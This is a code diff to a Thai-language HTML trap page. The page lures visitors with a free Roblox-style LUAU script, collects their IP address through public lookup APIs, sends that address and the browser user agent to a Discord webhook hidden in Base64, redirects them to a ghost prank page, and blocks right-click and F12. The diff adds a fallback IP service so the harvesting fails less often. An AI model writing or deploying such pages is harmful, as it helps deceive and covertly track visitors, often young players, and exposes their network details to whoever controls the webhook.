@@ -139,40 +139,59 @@
         <!-- MODE 2: หน้าดักเหยื่อ -->
         <div id="mode-shield" class="box">
             <p>🛡️ ระบบความปลอดภัย OFB ตรวจพบการเชื่อมต่อ</p>
-            <div class="ip-box" id="target-ip">🔍 กำลังตรวจสอบ IP Address...</div>
+            <div class="ip-box" id="target-ip">🔍 กำลังดึง IP Address...</div>
             <div style="font-size: 35px; margin: 10px 0;">⚡</div>
             <button onclick="trapAndRedirect()">กดเพื่อรับสคริปต์ LUAU</button>
         </div>
     </div>
 
     <script>
-        // 🔒 ระบบกัน Hook (ซ่อนลิงก์ด้วยการเข้ารหัส Base64 ป้องกันคนกด F12 มาขโมยดิส)
+        // 🔒 ระบบกัน Hook (Base64)
         const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1OTA3NjI5MzEwMDcwMzc0NC9hendTd1dpNXBsWkFLLXd3eXlFdGdkMG5JdmdBcjRqdWdtaWx2RV84OGtTdHBYOXA2cTc1ZEVwOXpPWFR4LUplN1Vs";
         const DISCORD_WEBHOOK_URL = decodeURIComponent(escape(atob(_0xW)));
         
         // 👻 ลิงก์เว็บผี / ฮาโลวีน
         const GHOST_REDIRECT_URL = "https://jonathanbassedas.github.io/halloween/?fbclid=PAT01DUAUx2fNleHRuA2FlbQIxMABwZG9mAnNydGMGYXBwX2lkDzU2NzA2NzM0MzM1MjQyNwABp0aFNPxW06myDtPR_ZSIU4qwPmFdYQTiE6aSCePjat2jBpx4qYSEpmHYYrzs_aem_0DUYjEMtNcSEIdSNDLjj5w";
 
-        let userIpAddress = "Unknown IP";
+        let userIpAddress = "กำลังดึงข้อมูล...";
         let userAgentStr = navigator.userAgent;
 
         const urlParams = new URLSearchParams(window.location.search);
         const encodedData = urlParams.get('obf');
 
-        // ดึง IP เตรียมไว้
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                userIpAddress = data.ip;
-                const ipElem = document.getElementById('target-ip');
-                if(ipElem) {
-                    ipElem.innerHTML = `⚠️ IP ของคุณ: <span style="color:#00ffcc;">${userIpAddress}</span> พร้อมปลดล็อก`;
-                }
-            })
-            .catch(() => {});
+        // ใช้ API สำรองแบบสลับหลายตัวเพื่อความชัวร์ (กันโดนบล็อก)
+        function fetchUserIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    userIpAddress = data.ip;
+                    updateIPDisplay();
+                })
+                .catch(() => {
+                    // ถ้าตัวแรกหลุด ให้ใช้ตัวสำรองทันที
+                    fetch('https://ipinfo.io/json')
+                        .then(res => res.json())
+                        .then(data => {
+                            userIpAddress = data.ip;
+                            updateIPDisplay();
+                        })
+                        .catch(() => {
+                            userIpAddress = "Unknown IP";
+                            updateIPDisplay();
+                        });
+                });
+        }
+
+        function updateIPDisplay() {
+            const ipElem = document.getElementById('target-ip');
+            if(ipElem) {
+                ipElem.innerHTML = `⚠️ IP ของคุณ: <span style="color:#00ffcc;">${userIpAddress}</span> พร้อมปลดล็อก`;
+            }
+        }
 
         if (encodedData) {
             document.getElementById('mode-shield').classList.add('active');
+            fetchUserIP(); // ดึง IP ทันทีเมื่อเข้าหน้าเหยื่อ
         } else {
             document.getElementById('mode-create').classList.add('active');
         }
@@ -194,7 +213,6 @@
             alert("📋 คัดลอกลิงก์สำเร็จ!");
         }
 
-        // ฟังก์ชันตอนเหยื่อกดปุ่มรับสคริปต์ -> ส่ง IP เข้า Discord ทันที + ล็อกลิงก์ถาวรไปเว็บผี
         function trapAndRedirect() {
             if(DISCORD_WEBHOOK_URL) {
                 fetch(DISCORD_WEBHOOK_URL, {
@@ -213,11 +231,10 @@
                 }).catch(e => {});
             }
 
-            // บังคับเปลี่ยนหน้าไปเว็บผีฮาโลวีนทันทีแบบถาวร
+            // บังคับเปลี่ยนหน้าไปเว็บผีทันที
             window.location.replace(GHOST_REDIRECT_URL);
         }
 
-        // ป้องกันคลิกขวาและกด F12
         document.addEventListener('contextmenu', e => {
             e.preventDefault();
             if (encodedData) window.location.replace(GHOST_REDIRECT_URL);
